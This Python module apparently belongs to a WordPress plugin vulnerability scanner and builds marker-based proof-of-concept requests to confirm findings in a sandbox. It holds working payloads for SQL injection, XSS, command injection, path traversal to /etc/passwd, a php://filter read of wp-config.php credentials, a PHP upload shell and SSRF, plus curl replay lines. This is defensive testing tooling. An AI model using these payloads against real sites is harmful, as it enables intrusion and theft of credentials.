"""PoC generation: Finding -> concrete, replayable exploit plan.

Every PoC carries a unique run marker so a verification result is only
"VERIFIED" when the marker (or a marker-derived side effect) is observed on
the sandbox -- reflections, MySQL error strings, server-side state, or a
probe hit.  PoCs are deliberately benign: they prove reachability and
impact by observing a marker, never by destroying sandbox state.
"""

import re
from urllib.parse import quote
from dataclasses import dataclass, field

_SUPERGLOBAL_KEY = re.compile(
    r"\$_(GET|POST|REQUEST|COOKIE)\s*\[\s*['\"]([A-Za-z0-9_\-\.]+)['\"]\s*\]")


def new_run_token() -> str:
    import secrets
    return "WPBF" + secrets.token_hex(4).upper()


def params_from_finding(finding, plugin_source_dir=None) -> dict:
    """{$key: 'GET'|'POST'} for every superglobal key the code reads.

    The sink snippet often only names the tainted variable, so also scan the
    whole source file that holds the sink (and the file that registers the
    entry point) — the real request key (e.g. $_GET['order']) is usually
    found there.
    """
    import os
    out = {}

    def scan(text):
        for m in _SUPERGLOBAL_KEY.finditer(text or ""):
            src, key = m.group(1), m.group(2)
            out.setdefault(key, "GET" if src in ("GET", "REQUEST") else "POST")

    scan(finding.snippet)
    if plugin_source_dir:
        files = [finding.file, (finding.entry or {}).get("file")]
        for rel in files:
            if not rel:
                continue
            try:
                with open(os.path.join(plugin_source_dir, rel),
                          encoding="utf-8", errors="replace") as fh:
                    scan(fh.read())
            except OSError:
                pass
    return out


@dataclass
class Attempt:
    """One concrete HTTP attempt of a PoC variant (agent tries in order)."""
    label: str
    method: str = "GET"
    params: dict = field(default_factory=dict)          # query params
    body_params: dict = field(default_factory=dict)     # form body
    success_requires: dict = field(default_factory=dict)
    expect_delay_secs: float = 0.0   # >0 -> time-based verdict


@dataclass
class PoC:
    rule: str
    endpoint_kind: str        # ajax | form | rest | shortcode | frontend | unknown
    marker: str
    base_url: str             # site-relative URL
    attempts: list = field(default_factory=list)
    needs_auth: str = "none"  # none | subscriber | admin
    setup: list = field(default_factory=list)   # sandbox actions, see agent
    observable: str = ""      # human explanation of the success check
    upload: dict = field(default_factory=dict)  # multipart spec for file_upload
    notes: str = ""

    def to_dict(self) -> dict:
        return {
            "rule": self.rule, "endpoint_kind": self.endpoint_kind,
            "marker": self.marker, "base_url": self.base_url,
            "needs_auth": self.needs_auth, "setup": self.setup,
            "observable": self.observable, "upload": self.upload,
            "notes": self.notes,
            "attempts": [a.__dict__ for a in self.attempts],
        }


def _split_params(kinds: dict, value) -> tuple:
    """Discovered params split by source -> (GET dict, POST dict)."""
    get, post = {}, {}
    for k, where in kinds.items():
        if where == "GET":
            get[k] = value
        else:
            post[k] = value
    return get, post


def _endpoint_route(kind: str, hook: str) -> tuple:
    """(site-relative base URL, ajax/form action name)."""
    if kind == "ajax":
        action = re.sub(r"^(wp_ajax_nopriv_|wp_ajax_)", "", hook)
        return "/wp-admin/admin-ajax.php", action
    if kind == "form":
        action = re.sub(r"^admin_post_(nopriv_)?", "", hook)
        return "/wp-admin/admin-post.php", action
    return "/", None


def rest_route_from_source(source: str) -> str:
    """'/wp-json/...' path parsed from a register_rest_route() call."""
    m = re.search(
        r"register_rest_route\s*\(\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        source)
    if m:
        return f"/wp-json/{m.group(1)}{m.group(2)}"
    return "/wp-json/wp/v2/wpbf-unknown-route"


def rest_route_for_finding(finding, plugin_source_dir: str) -> str:
    if not plugin_source_dir or not finding.file:
        return rest_route_from_source(finding.snippet or "")
    import os
    try:
        src = open(os.path.join(plugin_source_dir, finding.file),
                   encoding="utf-8", errors="replace").read()
        return rest_route_from_source(src)
    except OSError:
        return rest_route_from_source(finding.snippet or "")


def build_poc(finding, marker: str, host_probe_url: str = None,
              plugin_source_dir: str = None) -> PoC:
    rule = finding.rule
    entry = finding.entry or {}
    kind = entry.get("kind") if entry.get("hook") else "unknown"
    hook = entry.get("hook") or ""
    needs_auth = "none" if finding.attacker == "unauthenticated" else "subscriber"
    kinds = params_from_finding(finding, plugin_source_dir) or {"wpbf_param": "GET"}

    setup: list = []
    attempts: list = []
    observable = ""

    if kind in ("ajax", "form"):
        base_url, action = _endpoint_route(kind, hook)
    elif kind == "rest":
        base_url, action = rest_route_for_finding(finding, plugin_source_dir), None
    elif kind == "shortcode":
        base_url, action = "/wpbf-poc-page/", None   # created during setup
    else:
        base_url, action = "/", None

    def finish(built_attempts, obs, poc_setup=None):
        """Normalize: inject the action param for ajax/form endpoints."""
        out = []
        for (label, params, body, req, delay) in built_attempts:
            if action is not None:
                params = {**params, "action": action}
                body = {k: v for k, v in body.items() if k != "action"}
            out.append(Attempt(label=label, params=params,
                               body_params=body, success_requires=req,
                               expect_delay_secs=delay))
        return PoC(rule=rule, endpoint_kind=kind, marker=marker,
                   base_url=base_url, attempts=out, needs_auth=needs_auth,
                   setup=poc_setup or setup, observable=obs)

    if rule == "open_redirect":
        target = f"https://wpbf-redirect.invalid/{marker}"
        g, p = _split_params(kinds, target)
        return finish(
            [("__top: redirect to external marker host", g, p,
              {"navbar_event": "wpbf-redirect.invalid"}, 0)],
            "the browser navigates away to wpbf-redirect.invalid")

    if rule == "sqli":
        # WordPress magic-quotes backslash-escapes ' and " in request data,
        # so payloads must be quote-free: hex literals carry the marker, and
        # the time-based variant uses a scalar subquery that MySQL evaluates
        # exactly once (not once per ORDER BY row).
        mh = marker.encode("utf-8").hex()
        err_pay = f"1 AND EXTRACTVALUE(1,CONCAT(0x7e,0x{mh}))"
        sleep_pay = "(SELECT SLEEP(4) FROM (SELECT 1)x LIMIT 1)"
        g1, p1 = _split_params(kinds, err_pay)
        g2, p2 = _split_params(kinds, sleep_pay)
        return finish(
            [("error-based: EXTRACTVALUE leaks marker in the SQL error",
              g1, p1, {"body_contains": "~" + marker}, 0),
             ("time-based: single-shot SLEEP(4) delays the response ~4s",
              g2, p2, {}, 3.5)],
            f"WordPress database error showing ~{marker} (WP_DEBUG on), "
            f"or a response delayed ~4s by SLEEP",
            poc_setup=[{"type": "enable_debug"}])

    if rule in ("xss", "stored_xss"):
        payload = f'"><svg/onload=window.__wpbf=1></svg><b>{marker}</b>'
        g, p = _split_params(kinds, payload)
        return finish(
            [("payload reflected unescaped + onload executed", g, p,
              {"body_contains_raw": f"<b>{marker}</b>", "js_property": "__wpbf"},
              0)],
            f"raw '<b>{marker}</b>' in HTML and the onload handler runs")

    if rule == "rce":
        payload = f"'; echo {marker}; echo '"
        g, p = _split_params(kinds, payload)
        return finish(
            [("marker appears in command output", g, p,
              {"body_contains": marker}, 0)],
            f"command output containing {marker} returned to the caller")

    if rule == "ssrf":
        target = host_probe_url or "http://host.docker.internal:9/wpbf-probe"
        g, p = _split_params(kinds, target)
        return finish(
            [("server fetches the agent probe URL", g, p,
              {"probe_hit": marker}, 0)],
            "the agent's internal probe listener receives the hit")

    if rule == "object_injection":
        payload = 'O:8:"stdClass":0:{}'
        g, p = _split_params(kinds, payload)
        return finish(
            [("serialized object accepted (class/error text)", g, p,
              {"body_regex": r"(stdClass|unserialize|Fatal error)"}, 0)],
            "PHP reacts to the injected object (class/error text in response)")

    if rule == "file_read":
        g, p = _split_params(kinds, "../../../../../../etc/passwd")
        return finish(
            [("traversal to /etc/passwd", g, p,
              {"body_regex": r"root:[x*]:"}, 0)],
            "contents of /etc/passwd in the response")

    if rule == "file_inclusion":
        g, p = _split_params(
            kinds, "php://filter/convert.base64-encode/resource=wp-config.php")
        return finish(
            [("PHP filter read of wp-config.php", g, p,
              {"base64_contains": "DB_PASSWORD"}, 0)],
            "wp-config.php content (base64-decoded) leaks in the response")

    if rule == "file_write":
        target_file = "wp-content/wpbf_marker_write.txt"
        marker_txt = f"written-by-{marker}"
        setup.append({"type": "cleanup_file", "container_path": target_file})
        g, p = _split_params(kinds, f"../../{marker_txt}")
        return finish(
            [("marker file written outside the target dir", g, p,
              {"file_exists": target_file}, 0)],
            f"{target_file} exists in the sandbox afterwards")

    if rule == "file_deletion":
        slug = finding.plugin_slug or "wpbf-poc"
        target = f"wp-content/plugins/{slug}/wpbf_machine_deleteme.txt"
        setup.append({"type": "create_file", "container_path": target,
                      "content": "delete me"})
        rel1, rel2 = "wpbf_machine_deleteme.txt", \
            f"../plugins/{slug}/wpbf_machine_deleteme.txt"
        g1, p1 = _split_params(kinds, rel1)
        g2, p2 = _split_params(kinds, rel2)
        return finish(
            [("relative path", g1, p1, {"file_missing": target}, 0),
             ("traversed path", g2, p2, {"file_missing": target}, 0)],
            f"{target} is gone from the sandbox after the request")

    if rule == "options_update":
        opt = next(iter(kinds), "wpbf_marker_option")
        val = f"{marker}-value"
        setup.append({"type": "check_option_absent", "option": opt})
        g, p = _split_params({opt: "GET"}, opt)
        g = {**g, "wpbf_value": val}
        if action is not None:
            pass
        return finish(
            [("attacker-chosen option name written",
              {**g, "action": action} if action else g, p,
              {"option_eq": [opt, val]}, 0)],
            f"wp option get {opt} == {val} on the sandbox")

    if rule == "shortcode_exec":
        g, p = _split_params(kinds, f"[wpbf_marker_shortcode]{marker}")
        return finish(
            [("dynamically executed shortcode", g, p,
              {"body_contains": marker}, 0)],
            f"evaluated shortcode output containing {marker}")

    if rule == "file_upload":
        needs_auth = needs_auth if needs_auth != "none" else "subscriber"
        setup.append({"type": "cleanup_upload", "filename": "wpbf_poc_shell.php"})
        poc = finish(
            [("multipart upload of a .php file", {}, {},
              {"uploaded_exec": marker}, 0)],
            f"the uploaded wpbf_poc_shell.php executes and returns {marker}")
        poc.upload = {"field": "wpbf_file", "filename": "wpbf_poc_shell.php",
                      "content": f"<?php echo '{marker}'; @unlink(__FILE__);"}
        return poc

    if rule in ("missing_authorization", "missing_nonce", "idor",
                "info_exposure", "variable_overwrite"):
        if rule == "missing_nonce":
            needs_auth = needs_auth if needs_auth != "none" else "subscriber"
        g, p = _split_params(kinds, marker)
        req = {"handler_replied": True}
        if rule in ("variable_overwrite", "info_exposure"):
            req["body_contains"] = marker
        return finish(
            [("unguarded handler responds to the attacker", g, p, req, 0)],
            "handler returns attacker-usable data/state instead of the "
            "`0`/`-1`/rest_forbidden rejection a guarded handler gives")

    return PoC(rule=rule, endpoint_kind=kind, marker=marker, base_url="",
               attempts=[], needs_auth=needs_auth, setup=setup, observable="",
               notes=f"no automated PoC for rule '{rule}' -> unverifiable")


def poc_curl(site: str, poc: PoC, attempt: Attempt) -> str:
    """curl reproduction line for the artifacts folder."""
    url = site.rstrip("/") + poc.base_url
    if attempt.params:
        url += "?" + "&".join(f"{quote(k)}={quote(str(v))}"
                              for k, v in attempt.params.items())
    if attempt.method == "POST":
        body = "&".join(f"{quote(k)}={quote(str(v))}"
                        for k, v in attempt.body_params.items())
        if body:
            return f"curl -i -X POST -d '{body}' '{url}'"
        if getattr(poc, "upload", None):
            fpath = poc.upload["filename"]
            name = poc.upload["field"]
            return (f"curl -i -F '{name}=@{fpath};type=application/x-php' "
                    f"'{url}'")
    return f"curl -i '{url}'"
